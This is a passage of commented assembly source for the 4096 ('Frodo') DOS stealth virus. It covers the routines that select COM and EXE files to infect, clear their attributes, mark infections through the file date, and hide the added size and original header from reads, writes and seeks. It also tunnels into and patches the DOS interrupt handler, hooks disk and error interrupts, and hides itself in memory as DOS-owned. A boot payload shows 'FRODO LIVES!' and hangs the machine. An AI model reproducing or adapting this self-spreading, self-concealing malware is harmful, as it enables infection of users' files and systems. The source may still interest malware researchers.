                cmp     byte ptr ds:hideclustercountchange,0
                je      exit_finish_infection
                push    bx
                mov     dl,ds:filedrive
                mov     ah,32h                  ; Get drive parameter block
                call    callint21               ; for drive dl
                mov     ax,cs:numfreeclusters
                mov     [bx+1Eh],ax             ; alter free cluster count
                pop     bx
exit_finish_infection:
                retn


checkFCBokinfect:
                call    saveregs
                mov     di,dx
                add     di,0Dh                  ; skip to extension
                push    ds
                pop     es
                jmp     short performchecksum   ; and check checksum for valid
                                                ; checksum

checkdsdxokinfect:
                call    saveregs
                push    ds
                pop     es
                mov     di,dx
                mov     cx,50h                  ; max filespec length
                xor     ax,ax
                mov     bl,0                    ; default drive
                cmp     byte ptr [di+1],':'     ; Is there a drive spec?
                jne     ondefaultdrive          ; nope, skip it
                mov     bl,[di]                 ; yup, get drive
                and     bl,1Fh                  ; and convert to number
ondefaultdrive:
                mov     cs:filedrive,bl
                repne   scasb                   ; find terminating 0 byte
performchecksum:
                mov     ax,[di-3]
                and     ax,0DFDFh               ; convert to uppercase
                add     ah,al
                mov     al,[di-4]
                and     al,0DFh                 ; convert to uppercase
                add     al,ah
                mov     byte ptr cs:EXEflag,0   ; assume COM file
                cmp     al,0DFh                 ; COM checksum?
                je      COMchecksum
                inc     byte ptr cs:EXEflag     ; assume EXE file
                cmp     al,0E2h                 ; EXE checksum?
                jne     otherchecksum
COMchecksum:
                call    restoreregs
                clc                             ; mark no error
                retn
otherchecksum:
                call    restoreregs
                stc                             ; mark error
                retn


getcurrentPSP:
                push    bx
                mov     ah,51h                  ; Get current PSP segment
                call    callint21
                mov     cs:currentPSP,bx        ; store it
                pop     bx
                retn


setup_infection:
                call    replaceint13and24
                push    dx
                mov     dl,cs:filedrive
                mov     ah,36h                  ; Get disk free space
                call    callint21
                mul     cx                      ; ax = bytes per cluster
                mul     bx                      ; dx:ax = bytes free space
                mov     bx,dx
                pop     dx
                or      bx,bx                   ; less than 65536 bytes free?
                jnz     enough_free_space       ; hopefully not
                cmp     ax,4000h                ; exit if less than 16384
                jb      exit_setup_infection    ; bytes free
enough_free_space:
                mov     ax,4300h                ; Get file attributes
                call    callint21
                jc      exit_setup_infection    ; exit on error
                mov     di,cx                   ; di = attributes
                xor     cx,cx
                mov     ax,4301h                ; Clear file attributes
                call    callint21
                cmp     byte ptr cs:errorflag,0 ; check for errors
                jne     exit_setup_infection
                mov     ax,3D02h                ; Open file read/write
                call    callint21
                jc      exit_setup_infection    ; exit on error
                mov     bx,ax                   ; move handle to bx
                                                ; xchg bx,ax is superior
                mov     cx,di
                mov     ax,4301h                ; Restore file attributes
                call    callint21
                push    bx
                mov     dl,cs:filedrive         ; Get file's drive number
                mov     ah,32h                  ; Get drive parameter block
                call    callint21               ; for disk dl
                mov     ax,[bx+1Eh]             ; Get free cluster count
                mov     cs:numfreeclusters,ax   ; and save it
                pop     bx                      ; return handle
                call    restoreint13and24
                retn
exit_setup_infection:
                xor     bx,bx
                dec     bx                      ; return bx=-1 on error
                call    restoreint13and24
                retn


checkforinfection:
                push    cx
                push    dx
                push    ax
                mov     ax,4400h                ; Get device information
                call    callint21               ; (set hide_size = 2)
                xor     dl,80h
                test    dl,80h                  ; Character device?  If so,
                jz      exit_checkforinfection  ; exit; cannot be infected
                mov     ax,5700h                ; Otherwise get time/date
                call    callint21
                test    dh,80h                  ; Check year bit for infection
exit_checkforinfection:
                pop     ax
                pop     dx
                pop     cx
                retn

obtainfilesize:
                call    saveregs
                mov     ax,4201h                ; Get current file position
                xor     cx,cx
                xor     dx,dx
                call    callint21
                mov     cs:curfileposlow,ax
                mov     cs:curfileposhigh,dx
                mov     ax,4202h                ; Go to end of file
                xor     cx,cx
                xor     dx,dx
                call    callint21
                mov     cs:filesizelow,ax
                mov     cs:filesizehigh,dx
                mov     ax,4200h                ; Return to file position
                mov     dx,cs:curfileposlow
                mov     cx,cs:curfileposhigh
                call    callint21
                call    restoreregs
                retn

getsetfiletimedate:
                or      al,al                   ; Get time/date?
                jnz     checkifsettimedate      ; if not, see if Set time/date
                and     word ptr cs:int21flags,0FFFEh ; turn off trap flag
                call    _popall
                call    callint21
                jc      gettimedate_error       ; exit on error
                test    dh,80h                  ; check year bit if infected
                jz      gettimedate_notinfected
                sub     dh,0C8h                 ; if so, hide change
gettimedate_notinfected:
                jmp     exitint21
gettimedate_error:
                or      word ptr cs:int21flags,1; turn on trap flag
                jmp     exitint21
checkifsettimedate:
                cmp     al,1                    ; Set time/date?
                jne     exit_filetimedate_pointer
                and     word ptr cs:int21flags,0FFFEh ; turn off trap flag
                test    dh,80h                  ; Infection bit set?
                jz      set_yearbitset
                sub     dh,0C8h                 ; clear infection bit
set_yearbitset:
                call    checkforinfection
                jz      set_datetime_nofinagle
                add     dh,0C8h                 ; set infection flag
set_datetime_nofinagle:
                call    callint21
                mov     [bp-4],ax
                adc     word ptr cs:int21flags,0; turn on/off trap flag
                jmp     _popall_then_exitint21  ; depending on result

handlemovefilepointer:
                cmp     al,2
                jne     exit_filetimedate_pointer
                call    checkforinfection
                jz      exit_filetimedate_pointer
                sub     word ptr [bp-0Ah],1000h ; hide file size
                sbb     word ptr [bp-8],0
exit_filetimedate_pointer:
                jmp     exitotherint21

handleread:
                and     byte ptr cs:int21flags,0FEh ; clear trap flag
                call    checkforinfection           ; exit if it is not
                jz      exit_filetimedate_pointer   ; infected -- no need
                                                    ; to do stealthy stuff
                mov     cs:savelength,cx
                mov     cs:savebuffer,dx
                mov     word ptr cs:return_code,0
                call    obtainfilesize
                mov     ax,cs:filesizelow       ; store the file size
                mov     dx,cs:filesizehigh
                sub     ax,1000h                ; get uninfected file size
                sbb     dx,0
                sub     ax,cs:curfileposlow     ; check if currently in
                sbb     dx,cs:curfileposhigh    ; virus code
                jns     not_in_virus_body       ; continue if not
                mov     word ptr [bp-4],0       ; set return code = 0
                jmp     handleopenclose_exit
not_in_virus_body:
                jnz     not_reading_header
                cmp     ax,cx                   ; reading from header?
                ja      not_reading_header
                mov     cs:savelength,ax        ; # bytes into header
not_reading_header:
                mov     dx,cs:curfileposlow
                mov     cx,cs:curfileposhigh
                or      cx,cx                   ; if reading > 64K into file,
                jnz     finish_reading          ; then no problems
                cmp     dx,1Ch                  ; if reading from header, then
                jbe     reading_from_header     ; do stealthy stuff
finish_reading:
                mov     dx,cs:savebuffer
                mov     cx,cs:savelength
                mov     ah,3Fh                  ; read file
                call    callint21
                add     ax,cs:return_code       ; ax = bytes read
                mov     [bp-4],ax               ; set return code properly
                jmp     _popall_then_exitint21
reading_from_header:
                mov     si,dx
                mov     di,dx
                add     di,cs:savelength
                cmp     di,1Ch                  ; reading all of header?
                jb      read_part_of_header     ; nope, calculate how much
                xor     di,di
                jmp     short do_read_from_header
read_part_of_header:
                sub     di,1Ch
                neg     di
do_read_from_header:
                mov     ax,dx
                mov     cx,cs:filesizehigh      ; calculate location in
                mov     dx,cs:filesizelow       ; the file of the virus
                add     dx,0Fh                  ; storage area for the
                adc     cx,0                    ; original 1Ch bytes of
                and     dx,0FFF0h               ; the file
                sub     dx,0FFCh
                sbb     cx,0
                add     dx,ax
                adc     cx,0
                mov     ax,4200h                ; go to that location
                call    callint21
                mov     cx,1Ch
                sub     cx,di
                sub     cx,si
                mov     ah,3Fh                  ; read the original header
                mov     dx,cs:savebuffer
                call    callint21
                add     cs:savebuffer,ax
                sub     cs:savelength,ax
                add     cs:return_code,ax
                xor     cx,cx                   ; go past the virus's header
                mov     dx,1Ch
                mov     ax,4200h
                call    callint21
                jmp     finish_reading          ; and continue the reading

handlewrite:
                and     byte ptr cs:int21flags,0FEh ; turn off trap flag
                call    checkforinfection
                jnz     continue_handlewrite
                jmp     exit_filetimedate_pointer
continue_handlewrite:
                mov     cs:savelength,cx
                mov     cs:savebuffer,dx
                mov     word ptr cs:return_code,0
                call    obtainfilesize
                mov     ax,cs:filesizelow
                mov     dx,cs:filesizehigh
                sub     ax,1000h                ; calculate original file
                sbb     dx,0                    ; size
                sub     ax,cs:curfileposlow     ; writing from inside the
                sbb     dx,cs:curfileposhigh    ; virus?
                js      finish_write            ; if not, we can continue
                jmp     short write_inside_virus; otherwise, fixup some stuff
finish_write:
                call    replaceint13and24
                push    cs
                pop     ds
                mov     dx,ds:filesizelow       ; calculate location in file
                mov     cx,ds:filesizehigh      ; of the virus storage of the
                add     dx,0Fh                  ; original 1Ch bytes of the
                adc     cx,0                    ; file
                and     dx,0FFF0h
                sub     dx,0FFCh
                sbb     cx,0
                mov     ax,4200h
                call    callint21
                mov     dx,offset oldheader
                mov     cx,1Ch
                mov     ah,3Fh                  ; read original header
                call    callint21
                mov     ax,4200h                ; go to beginning of file
                xor     cx,cx
                mov     dx,cx
                call    callint21
                mov     dx,offset oldheader
                mov     cx,1Ch
                mov     ah,40h                  ; write original header to
                call    callint21               ; the file
                mov     dx,0F000h               ; go back 4096 bytes
                mov     cx,0FFFFh               ; from the end of the
                mov     ax,4202h                ; file and
                call    callint21
                mov     ah,40h                  ; truncate the file
                xor     cx,cx                   ; at that position
                call    callint21
                mov     dx,ds:curfileposlow     ; Go to current file position
                mov     cx,ds:curfileposhigh
                mov     ax,4200h
                call    callint21
                mov     ax,5700h                ; Get file time/date
                call    callint21
                test    dh,80h
                jz      high_bit_aint_set
                sub     dh,0C8h                 ; restore file date
                mov     ax,5701h                ; put it onto the disk
                call    callint21
high_bit_aint_set:
                call    restoreint13and24
                jmp     exitotherint21
write_inside_virus:
                jnz     write_inside_header     ; write from start of file?
                cmp     ax,cx
                ja      write_inside_header     ; write from inside header?
                jmp     finish_write

write_inside_header:
                mov     dx,cs:curfileposlow
                mov     cx,cs:curfileposhigh
                or      cx,cx                   ; Reading over 64K?
                jnz     writemorethan1Chbytes
                cmp     dx,1Ch                  ; Reading over 1Ch bytes?
                ja      writemorethan1Chbytes
                jmp     finish_write
writemorethan1Chbytes:
                call    _popall
                call    callint21               ; chain to int 21h
                                                ; (allow write to take place)
                call    _pushall
                mov     ax,5700h                ; Get file time/date
                call    callint21
                test    dh,80h
                jnz     _popall_then_exitint21_
                add     dh,0C8h
                mov     ax,5701h                ; restore file date
                call    callint21
_popall_then_exitint21_:
                jmp     _popall_then_exitint21

                jmp     exitotherint21

int13:
                pop     word ptr cs:int13tempCSIP ; get calling CS:IP off
                pop     word ptr cs:int13tempCSIP+2 ; the stack
                pop     word ptr cs:int13flags
                and     word ptr cs:int13flags,0FFFEh ; turn off trap flag
                cmp     byte ptr cs:errorflag,0 ; any errors yet?
                jne     exitint13error          ; yes, already an error
                push    word ptr cs:int13flags
                call    dword ptr cs:origints
                jnc     exitint13
                inc     byte ptr cs:errorflag   ; mark error
exitint13error:
                stc                             ; mark error
exitint13:
                jmp     dword ptr cs:int13tempCSIP ; return to caller

int24:
                xor     al,al                   ; ignore error
                mov     byte ptr cs:errorflag,1 ; mark error
                iret

replaceint13and24:
                mov     byte ptr cs:errorflag,0 ; clear errors
                call    saveregs
                push    cs
                pop     ds
                mov     al,13h                  ; save int 13 handler
                call    getint
                mov     word ptr ds:origints,bx
                mov     word ptr ds:origints+2,es
                mov     word ptr ds:oldint13,bx
                mov     word ptr ds:oldint13+2,es
                mov     dl,0
                mov     al,0Dh                  ; fixed disk interrupt
                call    getint
                mov     ax,es
                cmp     ax,0C000h               ; is there a hard disk?
                jae     harddiskpresent         ; C000+ is in BIOS
                mov     dl,2
harddiskpresent:
                mov     al,0Eh                  ; floppy disk interrupt
                call    getint
                mov     ax,es
                cmp     ax,0C000h               ; check if floppy
                jae     floppypresent
                mov     dl,2
floppypresent:
                mov     ds:tracemode,dl
                call    replaceint1
                mov     ds:savess,ss            ; save stack
                mov     ds:savesp,sp
                push    cs                      ; save these on stack for
                mov     ax,offset setvirusints  ; return to setvirusints
                push    ax
                mov     ax,70h
                mov     es,ax
                mov     cx,0FFFFh
                mov     al,0CBh                 ; retf
                xor     di,di
                repne   scasb                   ;scan es:di for retf statement
                dec     di                      ; es:di->retf statement
                pushf
                push    es                      ; set up stack for iret to
                push    di                      ; the retf statement which
                                                ; will cause transfer of
                                                ; control to setvirusints
                pushf
                pop     ax
                or      ah,1                    ; turn on the trap flag
                push    ax
                in      al,21h                  ; save IMR in temporary
                mov     ds:saveIMR,al           ; buffer and then
                mov     al,0FFh                 ; disable all the
                out     21h,al                  ; interrupts
                popf
                xor     ax,ax                   ; reset disk
                jmp     dword ptr ds:origints   ; (int 13h call)
                                                ; then transfer control to
setvirusints:                                   ; setvirusints
                lds     dx,dword ptr ds:oldint1
                mov     al,1                    ; restore old int 1 handler
                call    setvect
                push    cs
                pop     ds
                mov     dx,offset int13         ; replace old int 13h handler
                mov     al,13h                  ; with virus's
                call    setvect
                mov     al,24h                  ; Get old critical error
                call    getint                  ; handler and save its
                mov     word ptr ds:oldint24,bx ; location
                mov     word ptr ds:oldint24+2,es
                mov     dx,offset int24
                mov     al,24h                  ; Replace int 24 handler
                call    setvect                 ; with virus's handler
                call    restoreregs
                retn


restoreint13and24:
                call    saveregs
                lds     dx,dword ptr cs:oldint13
                mov     al,13h
                call    setvect
                lds     dx,dword ptr cs:oldint24
                mov     al,24h
                call    setvect
                call    restoreregs
                retn


disableBREAK:
                mov     ax,3300h                ; Get current BREAK setting
                call    callint21
                mov     cs:BREAKsave,dl
                mov     ax,3301h                ; Turn BREAK off
                xor     dl,dl
                call    callint21
                retn


restoreBREAK:
                mov     dl,cs:BREAKsave
                mov     ax,3301h                ; restore BREAK setting
                call    callint21
                retn


_pushall:
                pop     word ptr cs:pushpopalltempstore
                pushf
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                jmp     word ptr cs:pushpopalltempstore

swapvirint21:
                les     di,dword ptr cs:oldint21; delve into original int
                mov     si,offset jmpfarptr     ; handler and swap the first
                push    cs                      ; 5 bytes.  This toggles it
                pop     ds                      ; between a jmp to the virus
                cld                             ; code and the original 5
                mov     cx,5                    ; bytes of the int handler
swapvirint21loop:                               ; this is a tunnelling method
                lodsb                           ; if I ever saw one
                xchg    al,es:[di]              ; puts the bytes in DOS's
                mov     [si-1],al               ; int 21h handler
                inc     di
                loop    swapvirint21loop

                retn


_popall:
                pop     word ptr cs:pushpopalltempstore
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf
                jmp     word ptr cs:pushpopalltempstore

restoreregs:
                mov     word ptr cs:storecall,offset _popall
                jmp     short do_saverestoreregs

saveregs:
                mov     word ptr cs:storecall,offset _pushall
do_saverestoreregs:
                mov     cs:storess,ss           ; save stack
                mov     cs:storesp,sp
                push    cs
                pop     ss
                mov     sp,cs:stackptr          ; set new stack
                call    word ptr cs:storecall
                mov     cs:stackptr,sp          ; update internal stack ptr
                mov     ss,cs:storess           ; and restore stack to
                mov     sp,cs:storesp           ; caller program's stack
                retn


replaceint1:
                mov     al,1                    ; get the old interrupt
                call    getint                  ; 1 handler and save it
                mov     word ptr cs:oldint1,bx  ; for later restoration
                mov     word ptr cs:oldint1+2,es
                push    cs
                pop     ds
                mov     dx,offset int1          ; set int 1 handler to
                call    setvect                 ; the virus int handler
                retn

allocatememory:
                call    allocate_memory
                jmp     exitotherint21

allocate_memory:
                cmp     byte ptr cs:checkres,0  ; installed check
                je      exitallocate_memory     ; exit if installed
                cmp     bx,0FFFFh               ; finding total memory?
                jne     exitallocate_memory     ; (virus trying to install?)
                mov     bx,160h                 ; allocate memory to virus
                call    callint21
                jc      exitallocate_memory     ; exit on error
                mov     dx,cs
                cmp     ax,dx
                jb      continue_allocate_memory
                mov     es,ax
                mov     ah,49h                  ; Free memory
                call    callint21
                jmp     short exitallocate_memory
continue_allocate_memory:
                dec     dx                      ; get segment of MCB
                mov     ds,dx
                mov     word ptr ds:[1],0       ; mark unused MCB
                inc     dx                      ; go to memory area
                mov     ds,dx
                mov     es,ax
                push    ax
                mov     word ptr cs:int21store+2,ax ; fixup segment
                xor     si,si
                mov     di,si
                mov     cx,0B00h
                rep     movsw                   ; copy virus up there
                dec     ax                      ; go to MCB
                mov     es,ax
                mov     ax,cs:ownerfirstMCB     ; get DOS PSP ID
                mov     es:[1],ax               ; make vir ID = DOS PSP ID
                mov     ax,offset exitallocate_memory
                push    ax
                retf

exitallocate_memory:
                retn

get_device_info:
                mov     byte ptr cs:hide_size,2
                jmp     exitotherint21

callint21: ; call original int 21h handler (tunnelled)
                pushf
                call    dword ptr cs:oldint21
                retn

bootblock:
                cli
                xor     ax,ax                   ; set new stack just below
                mov     ss,ax                   ; start of load area for
                mov     sp,7C00h                ; boot block
                jmp     short enter_bootblock
borderchars     db      'ллл '

FRODO_LIVES: ; bitmapped 'FRODO LIVES!'
                db      11111001b,11100000b,11100011b,11000011b,10000000b
                db      10000001b,00010001b,00010010b,00100100b,01000000b
                db      10000001b,00010001b,00010010b,00100100b,01000000b
                db      11110001b,11110001b,00010010b,00100100b,01000000b
                db      10000001b,00100001b,00010010b,00100100b,01000000b
                db      10000001b,00010000b,11100011b,11000011b,10000000b
                db      00000000b,00000000b,00000000b,00000000b,00000000b
                db      00000000b,00000000b,00000000b,00000000b,00000000b
                db      10000010b,01000100b,11111000b,01110000b,11000000b
                db      10000010b,01000100b,10000000b,10001000b,11000000b
                db      10000010b,01000100b,10000000b,10000000b,11000000b
                db      10000010b,01000100b,11110000b,01110000b,11000000b
                db      10000010b,00101000b,10000000b,00001000b,11000000b
                db      10000010b,00101000b,10000000b,10001000b,00000000b
                db      11110010b,00010000b,11111000b,01110000b,11000000b
enter_bootblock:
                push    cs
                pop     ds
                mov     dx,0B000h               ; get video page in bh
                mov     ah,0Fh                  ; get video mode in al
                int     10h                     ; get columns in ah

                cmp     al,7                    ; check if colour
                je      monochrome
                mov     dx,0B800h               ; colour segment
monochrome:
                mov     es,dx                   ; es->video segment
                cld
                xor     di,di
                mov     cx,25*80                ; entire screen
                mov     ax,720h                 ; ' ', normal attribute
                rep     stosw                   ; clear the screen
                mov     si,7C00h+FRODO_LIVES-bootblock
                mov     bx,2AEh
morelinestodisplay:
                mov     bp,5
                mov     di,bx
displaymorebackgroundontheline:
                lodsb                           ; get background pattern
                mov     dh,al
                mov     cx,8

displayinitialbackground:
                mov     ax,720h
                shl     dx,1
                jnc     spacechar
                mov     al,'л'
spacechar:
                stosw
                loop    displayinitialbackground

                dec     bp
                jnz     displaymorebackgroundontheline
                add     bx,80*2                 ; go to next line
                cmp     si,7C00h+enter_bootblock-bootblock
                jb      morelinestodisplay
                mov     ah,1                    ; set cursor mode to cx
                int     10h

                mov     al,8                    ; set new int 8 handler
                mov     dx,7C00h+int8-bootblock ; to spin border
                call    setvect
                mov     ax,7FEh                 ; enable timer interrupts only
                out     21h,al

                sti
                xor     bx,bx
                mov     cx,1
                jmp     short $                 ; loop forever while
                                                ; spinning the border

int8:                                           ; the timer interrupt spins
                dec     cx                      ; the border
                jnz     endint8
                xor     di,di
                inc     bx
                call    spin_border
                call    spin_border
                mov     cl,4                    ; wait 4 more ticks until
endint8:                                        ; next update
                mov     al,20h                  ; Signal end of interrupt
                out     20h,al
                iret

spin_border:
                mov     cx,28h                  ; do 40 characters across

dohorizontal:
                call    lookup_border_char
                stosw
                stosw
                loop    dohorizontal
patch2:
                add     di,9Eh                  ; go to next line
                mov     cx,17h                  ; do for next 23 lines

dovertical:                                     ; handle vertical borders
                call    lookup_border_char      ; get border character
                stosw                           ; print it on screen
patch3:
                add     di,9Eh                  ; go to next line
                loop    dovertical
patch1:
                std
        ; this code handles the other half of the border
                xor     byte ptr ds:[7C00h+patch1-bootblock],1 ; flip std,cld
                xor     byte ptr ds:[7C00h+patch2-bootblock+1],28h
                xor     byte ptr ds:[7C00h+patch3-bootblock+1],28h
                retn


lookup_border_char:
                and     bx,3                    ; find corresponding border
                mov     al,ds:[bx+7C00h+borderchars-bootblock]
                inc     bx                      ; character
                retn


setvect:
                push    es
                push    bx
                xor     bx,bx
                mov     es,bx
                mov     bl,al                   ; int # to bx
                shl     bx,1                    ; int # * 4 = offset in
                shl     bx,1                    ; interrupt table
                mov     es:[bx],dx              ; set the vector in the
                mov     es:[bx+2],ds            ; interrupt table
                pop     bx
                pop     es
                retn


writebootblock: ; this is an unfinished subroutine; it doesn't work properly
                call    replaceint13and24
                mov     dl,80h
                db      0E8h, 08h, 00h, 32h,0D2h,0E8h
                db       03h, 01h, 00h, 9Ah, 0Eh, 32h
                db       08h, 70h, 00h, 33h, 0Eh, 2Eh
                db       03h, 6Ch, 15h, 03h, 00h, 26h
                db       00h, 00h, 00h, 21h, 00h, 50h
                db       12h, 65h, 14h, 82h, 08h, 00h
                db       0Ch, 9Ah, 0Eh, 56h, 07h, 70h
                db       00h, 33h, 0Eh, 2Eh, 03h, 6Ch
                db       15h,0E2h, 0Ch, 1Eh, 93h, 00h
                db       00h,0E2h, 0Ch, 50h

                org 1200h
readbuffer      dw      ? ; beginning of the read buffer
lengthMOD512    dw      ? ; EXE header item - length of image modulo 512
lengthinpages   dw      ? ; EXE header item - length of image in pages
relocationitems dw      ? ; EXE header item - # relocation items
headersize      dw      ? ; EXE header item - header size in paragraphs
minmemory       dw      ? ; EXE header item - minimum memory allocation
maxmemory       dw      ? ; EXE header item - maximum memory allocation
initialSS       dw      ? ; EXE header item - initial SS value
initialSP       dw      ? ; EXE header item - initial SP value
wordchecksum    dw      ? ; EXE header item - checksum value
initialIP       dw      ? ; EXE header item - initial IP value
initialCS       dw      ? ; EXE header item - initial CS value
                db      12 dup (?) ; rest of header - unused
parmblock       dd      ? ; address of parameter block
filedrive       db      ? ; 0 = default drive
filetime        dw      ? ; saved file time
filedate        dw      ? ; saved file date
origints        dd      ? ; temporary scratch buffer for interrupt vectors
oldint1         dd      ? ; original interrupt 1 vector
oldint21        dd      ? ; original interrupt 21h vector
oldint13        dd      ? ; original interrupt 13h vector
oldint24        dd      ? ; original interrupt 24h vector
int13tempCSIP   dd      ? ; stores calling CS:IP of int 13h
carrierPSP      dw      ? ; carrier file PSP segment
DOSsegment      dw      ? ; segment of DOS list of lists
ownerfirstMCB   dw      ? ; owner of the first MCB
jmpfarptr       db      ? ; 0eah, jmp far ptr
int21store      dd      ? ; temporary storage for other 4 bytes
                          ; and for pointer to virus int 21h
tracemode       db      ? ; trace mode
instructionstotrace  db ? ; number of instructions to trace
handletable     dw      28h dup (?) ; array of handles
handlesleft     db      ? ; entries left in table
currentPSP      dw      ? ; storage for the current PSP segment
curfileposlow   dw      ? ; current file pointer location, low word
curfileposhigh  dw      ? ; current file pointer location, high word
filesizelow     dw      ? ; current file size, low word
filesizehigh    dw      ? ; current file size, high word
savebuffer      dw      ? ; storage for handle read, etc.
savelength      dw      ? ; functions
return_code     dw      ? ; returned in AX on exit of int 21h
int21flags      dw      ? ; storage of int 21h return flags register
tempFCB         db      25h dup (?) ; copy of the FCB
errorflag       db      ? ; 0 if no error, 1 if error
int13flags      dw      ? ; storage of int 13h return flags register
savess          dw      ? ; temporary storage of stack segment
savesp          dw      ? ; and stack pointer
BREAKsave       db      ? ; current BREAK state
checkres        db      ? ; already installed flag
initialax       dw      ? ; AX upon entry to carrier
saveIMR         db      ? ; storage for interrupt mask register
saveoffset      dw      ? ; temp storage of CS:IP of
savesegment     dw      ? ; caller to int 21h
pushpopalltempstore  dw ? ; push/popall caller address
numfreeclusters dw      ? ; total free clusters
DOSversion      db      ? ; current DOS version
hideclustercountchange db ? ; flag of whether to hide free cluster count
hide_size       db      ? ; hide filesize increase if equal to 0
copyparmblock   db      0eh dup (?) ; copy of the parameter block
origsp          dw      ? ; temporary storage of stack pointer
origss          dw      ? ; and stack segment
origcsip        dd      ? ; temporary storage of caller CS:IP
copyfilename    db      50h dup (?) ; copy of filename
storesp         dw      ? ; temporary storage of stack pointer
storess         dw      ? ; and stack segment
stackptr        dw      ? ; register storage stack pointer
storecall       dw      ? ; temporary storage of function offset

topstack = 1600h

_4096           ends
                end


